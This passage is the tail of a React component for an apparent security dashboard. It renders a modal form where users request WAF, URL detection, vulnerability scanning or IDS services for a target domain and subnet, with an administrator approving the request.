              <div className="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-500/30 text-cyan-400 flex items-center justify-center shadow-lg">
                <Sparkles size={20} />
              </div>
              <div>
                <h3 className="text-lg font-bold text-white">Request Security Services</h3>
                <p className="text-xs text-slate-400">Select security engines to deploy. Submits directly to Admin Approvals.</p>
              </div>
            </div>

            <form onSubmit={handleQuickRequestService} className="space-y-4 text-xs">
              <div className="space-y-2">
                <label className="block text-slate-300 font-semibold">Select Services to Request *</label>
                <div className="space-y-2">
                  {[
                    { id: 'waf', name: 'Web Application Firewall (WAF)', desc: 'Layer 7 OWASP CRS 3.3 active inspection & blocking' },
                    { id: 'url-detection', name: 'Malicious URL Detection & Telegram Bot', desc: 'XGBoost 99.8% AI Classifier and @FanosUrlScanBot alerts' },
                    { id: 'vulnerability-scanner', name: 'Web Vulnerability Scanner (DAST)', desc: 'Automated OWASP vulnerability crawler & security findings' },
                    { id: 'ids', name: 'Network Intrusion Detection System (IDS)', desc: 'Suricata deep packet inspection & flow analysis' },
                  ].map((s) => {
                    const isChecked = selectedReqServices.includes(s.id)
                    return (
                      <label
                        key={s.id}
                        className={`flex items-start gap-3 p-3 rounded-xl border cursor-pointer transition ${
                          isChecked
                            ? 'bg-cyan-500/15 border-cyan-500/40 text-white'
                            : 'bg-black/30 border-white/[0.08] text-slate-300 hover:border-white/[0.15]'
                        }`}
                      >
                        <input
                          type="checkbox"
                          checked={isChecked}
                          onChange={(e) => {
                            if (e.target.checked) setSelectedReqServices(prev => [...prev, s.id])
                            else setSelectedReqServices(prev => prev.filter(x => x !== s.id))
                          }}
                          className="mt-0.5 rounded accent-cyan-500 cursor-pointer"
                        />
                        <div>
                          <div className="font-bold text-white text-xs">{s.name}</div>
                          <div className="text-[11px] text-slate-400 mt-0.5">{s.desc}</div>
                        </div>
                      </label>
                    )
                  })}
                </div>
              </div>

              <div>
                <label className="block text-slate-300 font-semibold mb-1">Target Asset / Frontend Domain *</label>
                <input
                  type="text"
                  required
                  value={reqDomain}
                  onChange={(e) => setReqDomain(e.target.value)}
                  placeholder="flightops.ethiopianairlines.com"
                  className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-white/[0.1] text-white focus:border-cyan-400 outline-none font-mono"
                />
              </div>

              <div>
                <label className="block text-slate-300 font-semibold mb-1">Backend Origin / Network Subnet *</label>
                <input
                  type="text"
                  required
                  value={reqBackendIp}
                  onChange={(e) => setReqBackendIp(e.target.value)}
                  placeholder="10.200.0.0/16 or 127.0.0.1:8002"
                  className="w-full px-3.5 py-2.5 rounded-xl bg-slate-900 border border-white/[0.1] text-white focus:border-cyan-400 outline-none font-mono"
                />
              </div>

              <div className="p-3 rounded-xl bg-cyan-950/40 border border-cyan-500/20 text-[11px] text-cyan-300 flex items-center gap-2">
                <Clock size={14} className="flex-shrink-0" />
                <span>
                  Once submitted, this request appears in <strong>Admin Portal / Approvals</strong> where the administrator grants penetration testing authorization.
                </span>
              </div>

              <div className="pt-3 flex items-center justify-end gap-3">
                <button
                  type="button"
                  onClick={() => setOpenServiceReqModal(false)}
                  className="px-4 py-2 rounded-xl text-slate-400 hover:text-white"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={submittingReq || selectedReqServices.length === 0}
                  className="px-5 py-2.5 rounded-xl font-bold bg-gradient-to-r from-cyan-400 to-teal-400 text-slate-950 hover:brightness-110 transition cursor-pointer disabled:opacity-50"
                >
                  {submittingReq ? 'Submitting to Admin...' : 'Submit Request to Admin'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  )
}

